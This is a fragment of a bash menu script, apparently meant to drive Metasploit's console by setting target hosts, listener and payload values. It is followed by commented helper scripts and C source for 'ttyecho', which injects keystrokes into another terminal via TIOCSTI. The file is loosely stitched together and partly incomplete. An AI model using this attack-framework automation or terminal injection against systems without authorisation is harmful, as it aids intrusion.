do
mainmenu
done



# ---------------------------------------------
# ---------------------------------------------
# ---------------------------------------------
# ---------------------------------------------

# Blank Menu
	# clear
	# echo -e "${BBlue} ${White}                    Meta Play Recon                      ${BBlack}"
	# echo -e "${White} RHOST: ${Red}" $RHOST "${White} \t DHOSTS: ${Green}" $RHOSTS
	# echo -e "${White} LHOST: ${Red}" $LHOST "${White} \t LPORT: ${Red}" $LPORT
	# echo -e "${White} Payload: ${Red}" $payload "\t  ${White} Workspace:${Red}" $wspace
	# echo -e "${White} -------------${Cyan}-------------${White}-------------"

	# echo -e "${White} 1... : ${Red} \t"
	# echo -e "${White} 2... : ${Red} \t"
	# echo -e "${White} 3... : ${Red} \t"
	# echo -e "${White} 4... : ${Red} \t"
	# echo -e "${White} 5... : ${Red} \t"
	# echo -e "${White} 6... : ${Red} \t"
	# echo -e "${White} 7... : ${Red} \t"

	# echo -e "${White} -------------${Cyan}-------------${White}-------------"
	# echo " x ...Exit   a....Write all"

	# echo "  Choice: "
	# read pick

	# if [ $pick = 1 ]; then
	# 	echo -e "\n Enter New RHOST:"
	# 	read RHOST
	# 	cli="ttyecho -n ${ppts} setg RHOST ${RHOST}"
	# 	$cli
	# fi

	# if [ -z $pick ]; then
	# 	<landing>
	# fi
#! /bin/bash
#! /bin/bash


# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# -------------------------------------  Externally Called Scripts


#----------------------------------------------  Populates ./msf.tty with tty# of msfconsole
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#! /bin/bash
# echo "msfCon='$(tty)'" > ./msf.tty
# ms
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


#-------------------------------------------  Populates ./msf.tty with tty# of other console
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#! /bin/bash
# echo "otherCon='$(tty)'" >> ./msf.tty
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


# -------------------------------------------------------------- ms  - Starts up MSF console
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#!/bin/bash
# service postgresql start
# service metasploit start
# msfconsole
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


# -------------------------------------------------------------------------  ttyecho C source
# ---------------------------- *****  NOT MY CODE!!!!  ******--------------------------------
# Credit goes to:
# http://www.humbug.in/2010/utility-to-send-commands-or-data-to-other-terminals-ttypts/
# -------------------------------------------------------------------------------------------


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>

# void print_help(char *prog_name) {
#         printf("Usage: %s [-n] DEVNAME COMMAND\n", prog_name);
#         printf("Usage: '-n' is an optional argument if you want to push a new line at the end of the text\n");
#         printf("Usage: Will require 'sudo' to run if the executable is not setuid root\n");
#         exit(1);
# }

# int main (int argc, char *argv[]) {
#     char *cmd, *nl = "\n";
#     int i, fd;
#     int devno, commandno, newline;
#     int mem_len;
#     devno = 1; commandno = 2; newline = 0;
#     if (argc < 3) {
#         print_help(argv[0]);
#     }
#     if (argc > 3 && argv[1][0] == '-' && argv[1][1] == 'n') {
#         devno = 2; commandno = 3; newline=1;
#     } else if (argc > 3 && argv[1][0] == '-' && argv[1][1] != 'n') {
#         printf("Invalid Option\n");
#         print_help(argv[0]);
#     }
#     fd = open(argv[devno],O_RDWR);
#     if(fd == -1) {
#         perror("open DEVICE");
#         exit(1);
#     }
#     mem_len = 0;
#     for ( i = commandno; i < argc; i++ ) {
#         mem_len += strlen(argv[i]) + 2;
#         if ( i > commandno ) {
#             cmd = (char *)realloc((void *)cmd, mem_len);
#         } else { //i == commandno
#             cmd = (char *)malloc(mem_len);
#         }

#         strcat(cmd, argv[i]);
#         strcat(cmd, " ");
#     }
#   if (newline == 0)
#         usleep(225000);
#     for (i = 0; cmd[i]; i++)
#         ioctl (fd, TIOCSTI, cmd+i);
#     if (newline == 1)
#         ioctl (fd, TIOCSTI, nl);
#     close(fd);
#     free((void *)cmd);
#     exit (0);
# }













